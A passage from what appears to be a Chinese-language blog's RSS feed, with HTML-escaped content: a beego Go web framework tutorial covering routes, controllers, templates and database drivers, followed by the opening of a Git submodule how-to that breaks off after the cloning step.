&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\_&lt;/span&gt;___/  &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\_&lt;/span&gt;__| &lt;span style=&#34;color:#4070a0;font-weight:bold&#34;&gt;\_&lt;/span&gt;__| v1.9.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2017/11/30 19:11:02 INFO     ▶ &lt;span style=&#34;color:#40a070&#34;&gt;0001&lt;/span&gt; Using &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt; as &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#39;appname&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2017/11/30 19:11:02 INFO     ▶ &lt;span style=&#34;color:#40a070&#34;&gt;0002&lt;/span&gt; Initializing watcher...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2017/11/30 19:11:03 SUCCESS  ▶ &lt;span style=&#34;color:#40a070&#34;&gt;0003&lt;/span&gt; Built Successfully!
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2017/11/30 19:11:03 INFO     ▶ &lt;span style=&#34;color:#40a070&#34;&gt;0004&lt;/span&gt; Restarting &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2017/11/30 19:11:03 SUCCESS  ▶ &lt;span style=&#34;color:#40a070&#34;&gt;0005&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#39;./hello&amp;#39;&lt;/span&gt; is running...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2017/11/30 19:11:03 &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;I&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;asm_amd64.s:2337&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt; http server Running on http://:8080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;img src=&#34;https://beego.me/docs/images/beerun.png&#34; alt=&#34;bee run&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;进阶开发&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%bf%9b%e9%98%b6%e5%bc%80%e5%8f%91&#34;&gt;
        ##
    &lt;/a&gt;
    进阶开发
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;route&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#route&#34;&gt;
        #
    &lt;/a&gt;
    Route
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;项目创建后的router文件在“routers/router.go”&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;package&lt;/span&gt; routers
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;import&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;wangq/test/beego/bee/hello/controllers&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;github.com/astaxie/beego&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#06287e&#34;&gt;init&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    beego.&lt;span style=&#34;color:#06287e&#34;&gt;Router&lt;/span&gt;(&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt;controllers.MainController{})
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;创建一条router记录的方法是调用“beego.Router”方法，并提供两个参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URI：请求的URI记录，比如&amp;quot;/&amp;quot;&lt;/li&gt;
&lt;li&gt;Controller：处理该请求的Controller&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;controller&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#controller&#34;&gt;
        #
    &lt;/a&gt;
    Controller
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;bee创建的项目controller位于“controllers/default.go”文件中。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;package&lt;/span&gt; controllers
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;import&lt;/span&gt; (
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;github.com/astaxie/beego&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;type&lt;/span&gt; MainController &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;struct&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        beego.Controller
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;func&lt;/span&gt; (c &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;MainController) &lt;span style=&#34;color:#06287e&#34;&gt;Get&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        c.Data[&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Website&amp;#34;&lt;/span&gt;] = &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;beego.me&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        c.Data[&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;Email&amp;#34;&lt;/span&gt;] = &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;astaxie@gmail.com&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        c.TplName = &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;index.tpl&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;项目的&amp;rsquo;MainController&amp;rsquo;继承自&amp;rsquo;beego.Controller&amp;rsquo;，&amp;lsquo;beego.Controller&amp;rsquo;中定义了interface &amp;lsquo;ControllerInterface&amp;rsquo;用于处理HTTP请求，这些接口包括&amp;quot;Init, Prepare, Post, Get, Delete, Head&amp;quot;等，因此&amp;rsquo;MainController&amp;rsquo;可以通过实现这些方法来处理相应的请求。&lt;/p&gt;
&lt;p&gt;在默认创建的controller中包括了&amp;rsquo;Get()&amp;lsquo;方法，该方法用来处理HTTP &amp;lsquo;GET&amp;rsquo;请求。&lt;/p&gt;
&lt;h3 id=&#34;get方法&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#get%e6%96%b9%e6%b3%95&#34;&gt;
        ##
    &lt;/a&gt;
    Get()方法：
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;c.Data: 处理方法主要是利用&amp;rsquo;c.Data&amp;rsquo;这个map（数据类型为：map[interface{}]interface{}）来存放返回的数据，其中的信息可以被template引用并render。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;c.TplName: 指定template文件名字，如果不指定这个名字那么beego会尝试使用&amp;rsquo;controller/method_name.tpl&amp;rsquo;名字的文件作为模版。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;view&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#view&#34;&gt;
        #
    &lt;/a&gt;
    View
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;beego使用go内建的html/template模版引擎，可以参考这个&lt;a href=&#34;https://github.com/Unknwon/build-web-application-with-golang_EN/blob/master/eBook/07.4.md&#34;&gt;使用方法&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;下面是例子模版，其中&amp;rsquo;{{.Website}}&amp;lsquo;及&amp;rsquo;{{.Email}}&amp;lsquo;是通过Controller的Data map提供给模版的参数。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;header&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;h1 &lt;span style=&#34;color:#bb60d5&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;logo&amp;#34;&lt;/span&gt;&amp;gt;Welcome to Beego&amp;lt;/h1&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;div &lt;span style=&#34;color:#bb60d5&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;description&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Beego is a simple &amp;amp; powerful Go web framework which is inspired by tornado and sinatra.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;/header&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;footer&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;div &lt;span style=&#34;color:#bb60d5&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;author&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Official website:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &amp;lt;a &lt;span style=&#34;color:#bb60d5&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;http://{{.Website}}&amp;#34;&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt;{{&lt;/span&gt;.Website&lt;span style=&#34;color:#666&#34;&gt;}}&lt;/span&gt;&amp;lt;/a&amp;gt; /
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Contact me:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &amp;lt;a &lt;span style=&#34;color:#bb60d5&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;mailto:{{.Email}}&amp;#34;&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#666&#34;&gt;{{&lt;/span&gt;.Email&lt;span style=&#34;color:#666&#34;&gt;}}&lt;/span&gt;&amp;lt;/a&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;/footer&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;div &lt;span style=&#34;color:#bb60d5&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;backdrop&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;script &lt;span style=&#34;color:#bb60d5&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;/static/js/reload.min.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;model&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#model&#34;&gt;
        #
    &lt;/a&gt;
    Model
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;GO语言相关的几个常用数据库支持如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MySQL：github.com/go-sql-driver/mysql&lt;/li&gt;
&lt;li&gt;PostgreSQL：github.com/lib/pq&lt;/li&gt;
&lt;li&gt;Sqlite3：github.com/mattn/go-sqlite3&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h1 id=&#34;beego架构&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#beego%e6%9e%b6%e6%9e%84&#34;&gt;
        ##
    &lt;/a&gt;
    beego架构
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;http://astaxie.me/beego/tutorial/hello.html&#34;&gt;工作流程&lt;/a&gt;：
&lt;img src=&#34;http://astaxie.me/beego/images/beegojiegou.png&#34; alt=&#34;architecture&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://beego.me/docs/mvc/&#34;&gt;详细执行流程&lt;/a&gt;：
&lt;img src=&#34;https://beego.me/docs/images/detail.png&#34; alt=&#34;Detail work flow&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83&#34;&gt;
        ##
    &lt;/a&gt;
    参考
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://astaxie.me/beego/tutorial/hello.html#!overview&#34;&gt;beego应用框架之入门&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Git Submodule使用方法</title>
      <link>/2017/11/git-submodule%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</link>
      <pubDate>Fri, 24 Nov 2017 15:49:02 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2017/11/git-submodule%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</guid>
      <description>&lt;p&gt;假设有两个项目project1和project2代码仓库：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ls project1/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HEAD        branches    config      description hooks       info        objects     refs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ls project2/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HEAD        branches    config      description hooks       info        objects     refs&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;1-从代码仓库clone开发库p1p2&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1-%e4%bb%8e%e4%bb%a3%e7%a0%81%e4%bb%93%e5%ba%93clone%e5%bc%80%e5%8f%91%e5%ba%93p1p2&#34;&gt;
        #
    &lt;/a&gt;
    1. 从代码仓库clone开发库p1/p2
&lt;/div&gt;
&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$git clone ../project1 p1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cloning into &lt;span style=&#34;font-style:italic&#34;&gt;&amp;#39;p1&amp;#39;&lt;/span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;warning: You appear to have cloned an empty repository.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;font-weight:bold&#34;&gt;done&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git clone ../project2 p2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cloning into &lt;span style=&#34;font-style:italic&#34;&gt;&amp;#39;p2&amp;#39;&lt;/span&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;warning: You appear to have cloned an empty repository.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;font-weight:bold&#34;&gt;done&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;2-对p1p2做一些改动并且push到原代码仓库&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2-%e5%af%b9p1p2%e5%81%9a%e4%b8%80%e4%ba%9b%e6%94%b9%e5%8a%a8%e5%b9%b6%e4%b8%94push%e5%88%b0%e5%8e%9f%e4%bb%a3%e7%a0%81%e4%bb%93%e5%ba%93&#34;&gt;
        #
    &lt;/a&gt;
    2. 对p1/p2做一些改动并且push到原代码仓库
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;在p1中添加新文件file1并且push到远程库project1&lt;/p&gt;
